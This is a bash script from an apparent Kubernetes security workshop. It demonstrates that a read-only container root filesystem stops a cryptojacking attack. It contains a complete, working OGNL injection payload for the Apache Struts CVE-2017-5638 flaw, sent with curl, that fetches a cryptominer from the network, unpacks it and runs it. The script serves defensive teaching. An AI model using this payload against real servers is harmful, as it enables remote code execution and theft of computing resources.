#!/usr/bin/env bash

set -eu
# In this example we will see the defensive techniques to limit  Cryptojacking attack

# Launch the pod with readonly root container file system in the specific user namespace and use that as an attack entry point to run  crypto worms. The container doesn't allow the cryptoworm to be downloaded.

echo "\n"
echo "************ Blue Team actions are started  **************"
echo "\n"

echo "Step 1: Vulnerable aapplication container with readonly root file system is deployed"
kubectl apply -f app-readonly-fs.yaml 
echo "\n"

echo "************ Blue Team actions are performed  **************"
echo "\n"

sleep 5

echo "************ Red Team actions are started  **************"
echo "\n"

echo "Step 2: Adversary enumerates and gain access to the kubernetes cluster"
echo "\n"

echo "Step 3: Adversary identified an Attack entry point - Vulnerable application endpoint"
echo "\n"

ENDPOINT="${WORKSHOP_NODE_IP:-localhost}:31301"
NS=struts

POD=$(kubectl get pod -n "$NS" -l app=api-server -o jsonpath="{.items[*].metadata.name}")

echo "Endpoint:  $ENDPOINT"
echo "Pod:       $POD"
echo "Namespace: $NS"
echo "\n"

echo "Step 4: Adversary is using the attack entry point, start exploiting the struts vulnerability present in the application to download and run a cryptominer..."
echo "\n"

timeout 5 curl -i -v -s -k -X GET -H "User-Agent: curl" -H "Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='sh -c \"wget -O /miner.tgz https://github.com/pooler/cpuminer/releases/download/v2.5.0/pooler-cpuminer-2.5.0-linux-x86_64.tar.gz && tar xzvf /miner.tgz && chmod +x ./minerd && ./minerd --url http://blackhole.local\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" "http://$ENDPOINT/apachestruts-cve20175638.action" || true

echo "\n"
echo "*********** Application container root fs is hardened - Cryptominer failed to download ... Attack is limited ***********"
echo "\n"
echo "Processes running inside the application container:"
kubectl exec -n "$NS" -it "$POD" -- sh -c "ps -C sh -C ps -N -o pid,comm"
